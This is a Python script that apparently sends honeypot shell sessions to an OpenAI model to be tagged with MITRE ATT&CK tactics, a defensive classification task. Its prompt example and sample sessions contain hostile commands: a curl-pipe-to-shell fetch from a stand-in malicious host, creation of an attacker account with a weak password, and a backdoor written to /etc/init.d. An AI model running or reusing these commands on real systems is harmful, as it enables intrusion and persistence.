import os
import openai
from dotenv import load_dotenv

# Load API key either from env or hardcoded (replace below with your real key)
load_dotenv()
OPENAI_API_KEY= os.getenv("OPENAI_API_KEY")

def query_openai(prompt: str, model: str, temperature: float = 0.7, max_tokens=150) -> str:
    openai_client = openai.OpenAI(api_key=OPENAI_API_KEY)
    response = openai_client.chat.completions.create(
        model=model,
        messages=[
            {"role": "system", "content": "You are a cybersecurity analyst."},
            {"role": "user", "content": prompt}
        ],
        temperature=temperature,
        max_tokens=max_tokens,
        stream=False,
    )
    return response.choices[0].message.content.strip()


input_path = "data/labeled_haas.jsonl"
output_path = "data/labeled_output.jsonl"

def classify_session(session_text):
    prompt = f"""
You are a cybersecurity analyst specialized in identifying attacker behavior from shell commands.
Your task: Analyze the session below and classify it by MITRE ATT&CK tactics.
Only output a valid JSON object with a "tactics" field listing tactics observed (no extra text).

Example:
Input:
curl http://malicious.com/malware.sh | sh
Output:
{{"tactics": ["Initial Access", "Execution"]}}

Session:
{session_text}

Output:
"""
    response = query_openai(prompt, "gpt-4o-mini", 0.1, 150)
    return response

# Example usage:
if __name__ == "__main__":
    example_sessions = [
        "curl http://malicious.com/malware.sh | sh",
        "useradd attacker && passwd attacker 12345",
        "echo 'evil backdoor' > /etc/init.d/backdoor"
    ]

    for session in example_sessions:
        print(f"Session:\n{session}")
        labels = classify_session(session)
        print(f"Labels: {labels}\n")
